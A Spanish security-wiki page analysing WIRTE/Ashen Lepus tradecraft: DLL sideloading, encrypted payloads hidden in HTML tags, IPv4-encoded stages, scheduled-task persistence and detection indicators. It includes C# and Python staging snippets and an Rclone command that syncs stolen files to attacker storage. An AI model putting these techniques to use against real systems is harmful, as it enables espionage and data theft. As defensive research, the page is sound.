# Carga lateral avanzada de DLL con preparación de payloads incrustados en HTML

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general de las tácticas

Ashen Lepus (también conocido como WIRTE) convirtió en arma un patrón repetible que encadena la carga lateral de DLL, payloads HTML por etapas y backdoors modulares de .NET para mantener la persistencia en redes diplomáticas de Oriente Medio. Cualquier operador puede reutilizar la técnica porque se basa en:<sup>[[1]](#references)</sup>

- **Ingeniería social basada en archivos comprimidos**: archivos PDF benignos indican a los objetivos que descarguen un archivo RAR desde un sitio para compartir archivos. El archivo incluye un EXE que parece un visor de documentos legítimo, una DLL maliciosa con el nombre de una biblioteca de confianza (p. ej., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) y un señuelo `Document.pdf`.
- **Abuso del orden de búsqueda de DLL**: la víctima hace doble clic en el EXE; Windows resuelve la importación de la DLL desde el directorio actual y el loader malicioso (AshenLoader) se ejecuta dentro del proceso de confianza mientras se abre el PDF señuelo para evitar sospechas.
- **Preparación con living-off-the-land**: cada etapa posterior (AshenStager → AshenOrchestrator → módulos) se mantiene fuera del disco hasta que se necesita y se entrega como blobs cifrados ocultos en respuestas HTML que, por lo demás, parecen inofensivas.

## Cadena de carga lateral en varias etapas

1. **EXE señuelo → AshenLoader**: el EXE carga lateralmente AshenLoader, que realiza reconocimiento del host, se cifra con AES-CTR y lo envía mediante POST dentro de parámetros rotativos como `token=`, `id=`, `q=` o `auth=` a rutas con apariencia de API (p. ej., `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **Extracción de HTML**: el C2 solo revela la siguiente etapa cuando la IP del cliente se geolocaliza en la región objetivo y el `User-Agent` coincide con el implant, lo que frustra los sandboxes. Si se cumplen las comprobaciones, el cuerpo HTTP contiene un blob `<headerp>...</headerp>` con el payload de AshenStager cifrado con Base64/AES-CTR.
3. **Segundo sideload**: AshenStager se despliega junto con otro binario legítimo que importa `wtsapi32.dll`. La copia maliciosa inyectada en el binario obtiene más HTML y, esta vez, extrae `<article>...</article>` para recuperar AshenOrchestrator.
4. **AshenOrchestrator**: un controlador modular de .NET que decodifica una configuración JSON en Base64. Los campos `tg` y `au` de la configuración se concatenan y se procesan con hash para obtener la clave AES, que descifra `xrk`. Los bytes resultantes sirven como clave XOR para cada blob de módulo obtenido posteriormente.
5. **Entrega de módulos**: cada módulo se describe mediante comentarios HTML que redirigen el parser a una etiqueta arbitraria, eludiendo las reglas estáticas que solo buscan `<headerp>` o `<article>`. Los módulos incluyen persistencia (`PR*`), desinstaladores (`UN*`), reconocimiento (`SN`), captura de pantalla (`SCT`) y exploración de archivos (`FE`).

### Patrón de análisis de contenedores HTML

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

Aunque los defensores bloqueen o eliminen un elemento específico, el operador solo tiene que cambiar la etiqueta indicada en el comentario HTML para reanudar la entrega.<sup>[[1]](#references)</sup>

### Ayudante rápido de extracción (Python)

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## Paralelismos con la evasión mediante HTML staging

Investigaciones recientes sobre HTML smuggling (Talos) destacan payloads ocultos como cadenas Base64 dentro de bloques `<script>` en adjuntos HTML y decodificados mediante JavaScript en tiempo de ejecución.<sup>[[2]](#references)</sup> El mismo truco puede reutilizarse para respuestas de C2: alojar blobs cifrados dentro de una etiqueta script (u otro elemento DOM) y decodificarlos en memoria antes de aplicar AES/XOR, haciendo que la página parezca HTML común. Talos también muestra ofuscación por capas (renombrado de identificadores más Base64/Caesar/AES) dentro de etiquetas script, lo que encaja perfectamente con blobs de C2 alojados en HTML.<sup>[[2]](#references)</sup> También es relevante aquí un informe posterior de Talos sobre **hidden text salting**: dividir Base64 con comentarios HTML irrelevantes o espacios en blanco basta para frustrar extractores regex simples, sin complicar la reconstrucción en el navegador.<sup>[[7]](#references)</sup>

## Notas sobre variantes recientes (2024-2025)

- Check Point observó campañas de WIRTE en 2024 que todavía dependían del sideloading basado en archivos comprimidos, pero usaban `propsys.dll` (stagerx64) como primera etapa. El stager decodifica el siguiente payload con Base64 + XOR (clave `53`), envía solicitudes HTTP con un `User-Agent` codificado de forma fija y extrae blobs cifrados incrustados entre etiquetas HTML. En una variante, la etapa se reconstruyó a partir de una larga lista de cadenas IP incrustadas, decodificadas mediante `RtlIpv4StringToAddressA` y luego concatenadas para formar los bytes del payload.<sup>[[3]](#references)</sup>
- OWN-CERT documentó herramientas anteriores de WIRTE en las que el dropper con sideloading de `wtsapi32.dll` protegía cadenas con Base64 + TEA y usaba el propio nombre de la DLL como clave de descifrado; luego ofuscaba con XOR/Base64 los datos de identificación del host antes de enviarlos al C2.<sup>[[4]](#references)</sup>

## Reconstrucción de etapas codificadas como IP

La variante de `propsys.dll` de WIRTE de 2024 muestra que el siguiente PE no tiene que estar almacenado en un único blob HTML contiguo. El loader puede guardar los bytes de la etapa como cadenas de direcciones IPv4 y reconstruirlos con `RtlIpv4StringToAddressA`, un patrón muy relacionado con la técnica **IPfuscation** de Hive.<sup>[[3]](#references)[[5]](#references)</sup> Desde el punto de vista operativo, esto resulta útil cuando el actor quiere que la página HTML contenga lo que parezcan IOCs inocuos o datos de configuración, en lugar de un payload Base64 evidente.

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

Si los bytes recuperados comienzan con `MZ`, probablemente reconstruiste directamente el siguiente PE. De lo contrario, comprueba si hay una capa inicial XOR/Base64 o pequeños fragmentos delimitadores entre direcciones.

## Nombres de DLL intercambiables y rotación de hosts

Una propiedad importante de este patrón es que el **backend de staging HTML/AES/XOR puede mantenerse idéntico mientras solo cambia el par de sideloading**. WIRTE alternó entre `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` y `propsys.dll` a lo largo de distintas campañas, lo cual resulta útil porque:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` y `wtsapi32.dll` son nombres de DLL de Windows comunes que los defensores esperan encontrar en `%System32%` / `%SysWOW64%`.
- Los catálogos públicos, como **HijackLibs**, ya identifican muchos binarios que cargarán esos nombres de DLL desde un directorio de aplicación copiado, lo que proporciona a los operadores hosts sustitutos sin tener que rediseñar el stager.
- Solo hay que adaptar la superficie de exportación para cada host. El parser HTML, las rutinas AES/XOR y el cargador de módulos normalmente pueden trasplantarse sin cambios a una DLL proxy de reenvío.

En el trabajo de laboratorio ofensivo, esto significa que puedes separar el problema en **(1) encontrar un host firmado y estable que resuelva localmente el nombre de DLL elegido** y **(2) reutilizar la misma lógica de carga de HTML por etapas detrás de esa DLL**.

## Refuerzo de criptografía y C2

- **AES-CTR en todas partes**: los loaders actuales incluyen claves de 256 bits y nonces (p. ej., `{9a 20 51 98 ...}`) y, opcionalmente, añaden una capa XOR usando cadenas como `msasn1.dll` antes o después del descifrado.<sup>[[1]](#references)</sup>
- **Variaciones del material de clave**: los loaders anteriores usaban Base64 + TEA para proteger cadenas incrustadas, y derivaban la clave de descifrado del nombre de la DLL maliciosa (p. ej., `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Separación de la infraestructura + camuflaje con subdominios**: los servidores de staging están separados por herramienta, alojados en distintos ASN y, a veces, usan subdominios con apariencia legítima como fachada, de modo que exponer una etapa no revela el resto.
- **Ocultación de reconocimiento**: los datos enumerados ahora incluyen listados de Program Files para detectar aplicaciones de alto valor y siempre se cifran antes de salir del host.
- **Rotación de URI**: los parámetros de consulta y las rutas REST cambian entre campañas (`/api/v1/account?token=` → `/api/v2/account?auth=`), lo que invalida las detecciones frágiles.
- **Fijación de User-Agent + redirecciones seguras**: la infraestructura C2 solo responde a cadenas UA exactas y, de lo contrario, redirige a sitios benignos de noticias o salud para camuflarse.
- **Entrega con control de acceso**: los servidores están restringidos geográficamente y solo responden a implants reales. Los clientes no aprobados reciben HTML inocuo.

## Persistencia y ciclo de ejecución

AshenStager crea tareas programadas que se hacen pasar por trabajos de mantenimiento de Windows y se ejecutan mediante `svchost.exe`, por ejemplo:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Estas tareas vuelven a iniciar la cadena de sideloading al arrancar o a intervalos regulares, lo que permite que AshenOrchestrator solicite módulos nuevos sin volver a tocar el disco.

## Uso de clientes de sincronización benignos para la exfiltración

Los operadores usan un módulo dedicado para colocar documentos diplomáticos en `C:\Users\Public` (legible por todos y no sospechoso) y, luego, descargan el binario legítimo [Rclone](https://rclone.org/) para sincronizar ese directorio con el almacenamiento del atacante. Unit42 señala que esta es la primera vez que se observa a este actor usando Rclone para la exfiltración, en consonancia con la tendencia general de abusar de herramientas legítimas de sincronización para camuflarse en el tráfico normal:<sup>[[1]](#references)</sup>

1. **Preparación**: copia o recopila los archivos objetivo en `C:\Users\Public\{campaign}\`.
2. **Configuración**: distribuye una configuración de Rclone que apunte a un endpoint HTTPS controlado por el atacante (p. ej., `api.technology-system[.]com`).
3. **Sincronización**: ejecuta `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` para que el tráfico se parezca al de las copias de seguridad en la nube habituales.

Como Rclone se usa ampliamente para flujos de trabajo legítimos de copia de seguridad, los defensores deben centrarse en ejecuciones anómalas (binarios nuevos, remotos inusuales o sincronizaciones repentinas de `C:\Users\Public`).

## Indicadores para la detección

- Genera alertas cuando **procesos firmados** carguen inesperadamente DLL desde rutas en las que los usuarios pueden escribir (filtros de Procmon + `Get-ProcessMitigation -Module`), sobre todo si los nombres de DLL coinciden con `netutils`, `srvcli`, `dwampi`, `wtsapi32` o `propsys`.<sup>[[6]](#references)</sup>
- Inspecciona las respuestas HTTPS sospechosas en busca de **grandes bloques Base64 incrustados en etiquetas inusuales** o protegidos por comentarios `<!-- TAG: <xyz> -->`.
- Normaliza primero el HTML: **elimina los comentarios y reduce los espacios en blanco antes de extraer Base64**, ya que la evasión mediante salado de texto oculto puede dividir los payloads entre los límites de los comentarios.
- Amplía la búsqueda en HTML para incluir **cadenas Base64 dentro de bloques `<script>`** (staging al estilo de HTML smuggling) que se decodifican mediante JavaScript antes del procesamiento AES/XOR.
- Busca llamadas repetidas a **`RtlIpv4StringToAddressA` seguidas del ensamblado de buffers**, sobre todo cuando las cadenas circundantes son listas largas de IPv4 en lugar de destinos de red reales.
- Busca **tareas programadas** que ejecuten `svchost.exe` con argumentos que no sean de servicio o que apunten a directorios de droppers.
- Rastrea las **redirecciones C2** que solo devuelven payloads para cadenas `User-Agent` exactas y, de lo contrario, redirigen a dominios legítimos de noticias o salud.
- Supervisa la aparición de binarios de **Rclone** fuera de las ubicaciones gestionadas por TI, nuevos archivos `rclone.conf` o trabajos de sincronización que recojan datos de directorios de staging como `C:\Users\Public`.

## References

- [1] [Ashen Lepus, afiliado a Hamás, ataca entidades diplomáticas de Oriente Medio con el nuevo conjunto de malware AshTag](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Oculto entre las etiquetas: análisis de las técnicas de evasión en HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [El actor de amenazas WIRTE, afiliado a Hamás, continúa sus operaciones en Oriente Medio y pasa a actividades disruptivas](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: en busca del tiempo perdido](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware implementa una novedosa técnica IPfuscation para evadir la detección](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Posible sideloading de DLL del sistema desde ubicaciones que no son del sistema](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Condimentar las amenazas por correo electrónico con salado de texto oculto](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
